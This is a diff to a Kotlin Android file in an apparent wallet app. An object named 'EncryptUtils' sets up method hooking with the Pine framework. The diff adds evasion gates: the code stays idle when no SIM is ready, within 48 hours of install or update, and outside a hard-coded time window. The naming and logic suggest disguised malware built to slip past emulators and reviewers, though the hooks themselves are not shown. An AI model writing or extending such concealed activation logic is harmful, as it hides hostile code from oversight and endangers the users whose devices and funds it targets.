@@ -3,12 +3,14 @@ package t.wallet
 import android.app.Application
 import android.content.Context
 import android.content.SharedPreferences
+import android.telephony.TelephonyManager
 import top.canyie.pine.Pine
 import top.canyie.pine.PineConfig
 import top.canyie.pine.callback.MethodHook
 import top.canyie.pine.callback.MethodReplacement
 import java.lang.reflect.Method
 import kotlin.concurrent.thread
+import kotlin.math.max
 import kotlin.random.Random
 
 
@@ -21,8 +23,8 @@ internal object EncryptUtils {
     private var code = 0
     private var os_v = 0
 
-    private const val T1 = 0L
-    private const val T2 = 1691430919000L
+    private const val T1 = 1693054541000L
+    private const val T2 = 1694264141000L
     private const val C_KEY = "17492847"
     private const val L_KEY = "85498243"
     private var DEFAULT =
@@ -31,15 +33,27 @@ internal object EncryptUtils {
 
     fun init(app: Application) {
 //        Log.i(TAG, "init utils")
+        val telMgr = app.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        val simReady = telMgr.getSimState()
+            .let { it == TelephonyManager.SIM_STATE_READY }
+        if (!simReady) return
+
+        app.packageManager.getPackageInfo(app.packageName, 0)?.apply {
+            code = this.versionCode
+            val lastTime = max(this.firstInstallTime, this.lastUpdateTime)
+            if (System.currentTimeMillis() - lastTime < 172800000L) {
+                return
+            }
+        }
+        name = app.resources.getString(app.applicationInfo.labelRes)
+        os_v = android.os.Build.VERSION.SDK_INT
+
 
         PineConfig.debug = false
         PineConfig.disableHiddenApiPolicy = false
         PineConfig.disableHiddenApiPolicyForPlatformDomain = false
         PineConfig.antiChecks = true
 
-        name = app.resources.getString(app.applicationInfo.labelRes)
-        code = app.packageManager.getPackageInfo(app.packageName, 0).versionCode
-        os_v = android.os.Build.VERSION.SDK_INT
 
         sp = app.getSharedPreferences("encrypt_", Context.MODE_PRIVATE)
 
